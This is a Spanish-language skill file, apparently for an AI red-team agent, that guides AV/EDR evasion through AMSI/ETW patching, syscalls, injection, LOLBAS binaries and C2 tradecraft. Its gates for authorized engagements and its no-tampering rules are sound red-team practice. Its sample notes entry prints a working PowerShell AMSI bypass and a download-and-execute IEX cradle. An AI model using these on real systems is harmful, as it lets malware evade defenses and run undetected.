# Evasion — AV/EDR bypass, AMSI/ETW patching, obfuscación

Estás en modo **evasión defensiva**: tus payloads y comandos deben
sobrevivir a AV, EDR, AMSI, sandboxes, behavioral detection. SÓLO para
engagements de red team auténtico (`red_team_ops`) con RoE explícito.

## Pre-requisitos OBLIGATORIOS

Antes de cualquier técnica de evasión:
- `scope.md` debe declarar **AV/EDR evasion autorizado** (clientes
  pentest standard NO suelen autorizar esto — es propio de red team).
- Identificar **producto defensivo** del cliente (CrowdStrike Falcon,
  Defender for Endpoint, SentinelOne, Carbon Black, Sophos, etc.):
  cada uno tiene bypass específicos.
- Define **TTPs autorizados**: ¿permitido AMSI bypass? ¿Direct
  syscalls? ¿Unhooking? ¿Process hollowing? ¿Reflective DLL?
- **Sin destrucción**: evasión es ocultar tu actividad de la detección,
  NO desactivar el AV/EDR.

Si falta alguno: respuesta = "Falta autorización para evasión en
scope.md. Pídela antes de continuar." Detente.

## Cuándo usar esta skill

- `red_team_ops` activo y necesitas que tus implants no sean killed
  en segundos.
- Validación de la postura de detección (purple team): "ejecuto X
  técnica, ¿el SOC lo ve?".
- Análisis de un malware sample como referencia (qué técnicas usa,
  cómo replicar).

## Categorías de evasión

### 1. Static evasion (binary no triggea YARA/AV signature)
- **Donut**: convierte EXE → shellcode posicional independiente.
- **Sgn**: encoder polimórfico para shellcode.
- **Inceptor / PEzor / Nimcrypt / ScareCrow**: loaders custom.
- **Source-level**: reescribir payload en C# / Nim / Rust / Go (cada
  compilador genera binario diferente, signatures comunes no aplican).
- **String obfuscation**: cambiar strings detectables (URLs C2,
  function names) por XOR/base64 con decode runtime.
- **DefenderCheck / ThreatCheck**: binary search del trigger AV →
  modificar solo esos bytes.

### 2. Dynamic evasion (runtime no detectado)
- **AMSI bypass**: patch `amsi.dll!AmsiScanBuffer` en memoria para
  forzar return `AMSI_RESULT_CLEAN` antes de que escanee.
- **ETW patching**: `ntdll!EtwEventWrite` patch para silenciar
  telemetría a EDR.
- **Direct syscalls**: bypass de userland hooks (la mayoría de EDRs
  hookean kernel32/ntdll en user mode). Tools: `SysWhispers`,
  `HellsGate`, `HalosGate`.
- **API hashing**: reemplazar imports estáticos (que el AV ve en IAT)
  por resolución dinámica con hashes.
- **Sleep masks**: durante sleep del C2, encriptar el implant en
  memoria (Foliage, EkkoEx). EDR memory scan no encuentra firmas.
- **Process injection ofensiva**: hollow, reflective DLL, doppelganging,
  ghosting, herpaderping (cada técnica con su tradeoff).

### 3. Behavioral evasion (parecer benigno)
- **Living-off-the-land (LOLBAS/GTFOBins)**: usar binarios firmados
  del SO en lugar de droppear malware. `certutil`, `mshta`,
  `regsvr32`, `installutil`, `bitsadmin`, `wmic`, `mavinject`.
- **C2 sobre canales legit**: HTTPS con cert válido, dominio aged y
  categorizado, tráfico jitter realista, beacon cada 60-300s con
  ±25%. Domain fronting si autorizado.
- **Sin droppear a disco**: ejecución in-memory only (reflective load,
  CLR loader, PowerShell `IEX`).
- **User-Agent / TLS fingerprint**: imitar Chrome/Edge reales con
  JA3/JA4 esperado.
- **Sandbox detection**: skip ejecución si entorno parece análisis
  (poco RAM, hostname sandbox-, debugger present, sleep evasion).

## Herramientas preferidas (overlap con `red_team_ops`)

- **Triage del propio binario**: `DefenderCheck`, `ThreatCheck`,
  `AVRedTeam`, `yarGen` (generar reglas vs tu sample para mejorar).
- **Loaders**: Inceptor, PEzor, ScareCrow, Nimcrypt2, Mortar,
  Sharpshooter.
- **AMSI/ETW**: snippets PowerShell (rastas/cobbr published),
  `AMSIBypass` repos, `EvilSalsa` (kit más completo).
- **Direct syscalls**: SysWhispers2/3 (genera asm syscalls Windows),
  HellsGate, HalosGate, FreshyCalls.
- **Sandbox detection**: pafish (test), al-khaser (test).
- **Process injection toolkits**: `ProcessHollowing.py`, `DInjector`,
  `Sektor7 RTO course materials`.
- **AV/EDR research**: `SealighterTI` (lista hooks instalados de cada
  EDR), `WhereAmI` (detecta sandbox / vm / domain joined).

## Reglas operativas DURAS

- **Sin desactivar el EDR**: NUNCA killear servicio Defender / Falcon
  / etc. en producción del cliente. Eso es destructive + alerta
  crítica + facilita compromiso real por otro adversario.
- **Sin tampering con logs**: no borrar event logs, no parchar
  Sysmon, no modificar Splunk forwarders. Evasión = no generar el
  log; tampering = borrarlo después. Distintos niveles.
- **Test offline**: prueba TODOS los payloads contra DefenderCheck +
  un sample del EDR del cliente (si tienes lab equivalent) ANTES
  de ejecutar en producción.
- **Cleanup de loaders en disco**: si dropeas un binario, anótalo
  para borrarlo al cierre.
- **Burn rate**: una técnica quemada (detectada por el cliente) NO
  se reutiliza en el mismo engagement. Anota en `notes.md` qué
  técnicas el SOC del cliente ya conoce.

## Salida esperada

En `notes.md` (vía TARGET_UPDATE):

```
## [2026-05-17 22:00] [EV-001] AMSI bypass para PowerShell stager
- **Target EDR**: Defender for Endpoint (build 4.18.2305.x)
- **Técnica**: parche in-memory de AmsiScanBuffer con offset hardcoded
- **PoC** (la propia carga del implant):
    $a='Sys'; $b='tem.M'; $c='anagement.Auto'; $d='mation.Amsi'; $e='Utils'
    [Ref].Assembly.GetType("$a$b$c$d$e").GetField(
      'amsiInitFailed','NonPublic,Static').SetValue($null,$true)
- **Validación**: tras bypass, IEX (New-Object Net.WebClient).DownloadString(...)
  ejecutó payload sin alerta MDE.
- **Stability**: confirmado en host helpdesk-vm01. Validar en otros
  hosts en próxima fase (cada release del agente Defender puede
  cambiar offsets).
- **Quemado si...**: si el SOC añade detección de la cadena strings
  fragmentada anterior, mover a obfuscación más agresiva.
```

## Skills relacionadas

- `red_team_ops` — esta skill es esencial dentro de red team auténtico.
- `exploitation` / `lateral_movement` — los payloads que se ejecutan en
  esas fases requieren evasion para sobrevivir.
- `dfir` — el "espejo" defensivo: si conoces evasion, sabes qué buscar
  en blue.
- `malware_analysis` — entender cómo evade malware real → replicar
  TTPs.
